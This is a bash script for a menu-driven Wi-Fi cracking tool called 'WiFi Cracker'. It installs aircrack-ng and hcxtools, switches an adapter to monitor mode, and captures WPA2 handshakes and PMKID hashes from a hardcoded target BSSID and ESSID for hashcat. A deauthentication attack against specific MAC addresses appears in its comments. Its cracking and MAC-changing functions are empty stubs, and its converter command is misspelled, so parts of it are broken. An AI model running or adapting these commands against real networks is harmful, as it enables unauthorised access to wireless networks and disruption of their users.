#!/bin/bash

interface_name=""

##############################################################################################################

f_banner(){
echo
echo "

    ██     ██ ██       ███████ ██      ██████ ██████   █████   ██████ ██   ██ ███████ ██████
    ██     ██ ██       ██      ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██
    ██  █  ██ ██ █████ █████   ██     ██      ██████  ███████ ██      █████   █████   ██████
    ██ ███ ██ ██       ██      ██     ██      ██   ██ ██   ██ ██      ██  ██  ██      ██   ██
     ███ ███  ██       ██      ██      ██████ ██   ██ ██   ██  ██████ ██   ██ ███████ ██   ██

                                 Developed By The Winter Soldier "
echo
echo

}

##############################################################################################################

## Functions

setup_wireless_adapter() {
  echo
}

do_four_way_method() {
  sudo airodump-ng $interface_name
}

do_pmkid_hashcat() {
  target_bssid='9C:6F:52:36:73:01'
  target_essid='H369A367301'

  echo $target_bssid >> bssid_target.txt

  hcxdumptool -i $interface_name --filterlist_ap=bssid_target.txt --filtermode=2 --enable_status=2 -o pmkid.pcap

  # Inevitably you can hit Ctrl-C, then we convert the PMKID capture into hashcat format
  hcxpcatool -z target_wpa2_pmkid_hash.txt pmkid.pcap

}

crack_password() {
  echo
}

install_dependencies() {
  echo "Install all dependencies required for this script"
  echo "1. Aircrack-NG"
  sudo apt install -y aircrack-ng

  echo "2. Hcxdumptool"
  sudo apt-get install -y libcurl4-openssl-dev libssl-dev pkg-config
  git clone https://github.com/ZerBea/hcxdumptool.git
  cd hcxdumptool
  make
  sudo make install
  cd -

  echo "3. Hcxtools"
  git clone https://github.com/ZerBea/hcxtools.git
  cd hcxtools
  make
  sudo make install
  cd -
}



select_wireless_nic() {
  echo "All available Wireless Interfaces:"
  echo $(iwconfig)
  sleep 3
  clear

  interface_name=$(iwconfig 2>&1 | grep Monitor | sed 's/\"//g' | cut -f1  -d" "  )

  if [ -z "$interface_name" ]
  then
        interface_name=$(iwconfig 2>&1 | grep ESSID | sed 's/\"//g' | cut -f1  -d" "  )
  fi

#  mac_address=$(sudo ip -a link | grep $interface_name | sed 's/\"//g' | cut -f1  -d" " )
}

set_monitor_mode() {
  sudo ip link set $interface_name down
  sudo iw $interface_name set monitor none
  sudo ip link set $interface_name up
  select_wireless_nic
}

change_mac_address() {
  echo
}

check_wireless_nic_performance() {
  echo
}

deauthentication_attack() {
  echo "A target Station has been selected. Now choose an associated device to be booted"

  devices=$(sudo airodump-ng $interface_name --bssid $target_station_bssid --channel $target_channel)

#  aireplay-ng --deauth 0 -c $target_device_bssid -a $target_station_bssid $interface_name


#  sudo airodump-ng wlx00c0caa763ed --bssid 64:70:02:40:7B:E2 --channel 9

#  sudo aireplay-ng --deauth 0 -c 90:CD:B6:3D:20:FD -a 64:70:02:40:7B:E2 wlx00c0caa763ed

}


##############################################################################################################

## Wireless NIC Menu

setup_wireless_adapter() {
menu=""
until [ "$menu" = "10" ]; do

clear
f_banner

echo
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[+]\e[00m CURRENT CONFIGURATION: " "$interface_name" " with MAC: " "$mac_address"
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo "1. Select Wireless Network Interface Controller (NIC)"
echo "2. Place Wireless NIC in MONITOR Mode"
echo "3. Change MAC Address Wireless NIC"
echo ""
echo "0. Back"
echo

read menu
case $menu in

1)
clear
f_banner
select_wireless_nic
sleep 2
;;

2)
clear
f_banner
set_monitor_mode
sleep 2
;;

3)
clear
f_banner
change_mac_address
sleep 2
;;

0)
break
;;

*) ;;

esac
done
}


##############################################################################################################

## Advnced Attacks

advanced_attacks() {
menu=""
until [ "$menu" = "10" ]; do

clear
f_banner

echo
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[+]\e[00m  SELECT THE TASK YOU WANT TO PERFORM ON TARGET: " $ip_address
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo "1. Perform Deauthentication Attack"
echo ""
echo "0. Back"
echo

read menu
case $menu in

1)
clear
f_banner
deauthentication_attack
sleep 2
;;


0)
break
;;

*) ;;

esac
done
}


##############################################################################################################

## Automatic scan (no menu)



##############################################################################################################

## Main Menu

menu=""
until [ "$menu" = "10" ]; do

clear
f_banner

echo
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[+]\e[00m SELECT THE TASK YOU WANT TO PERFORM ON TARGET: " $ip_address
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo "1. Setup Wireless NIC"
echo "2. Four-Way Handshake method"
echo "3. PMKID Hashcat method"
echo "4. Advanced Attacks"
echo "5. Password cracking"
echo "6. Install Dependencies"
echo ""
echo "0. Back"
echo

read menu
case $menu in

1)
clear
f_banner
setup_wireless_adapter
;;

2)
clear
f_banner
do_four_way_method
;;

3)
clear
f_banner
do_pmkid_hashcat
;;

4)
clear
f_banner
advanced_attacks
;;

5)
clear
f_banner
crack_password
;;

6)
clear
f_banner
install_dependencies
;;

0)
break
;;

*) ;;

esac
done
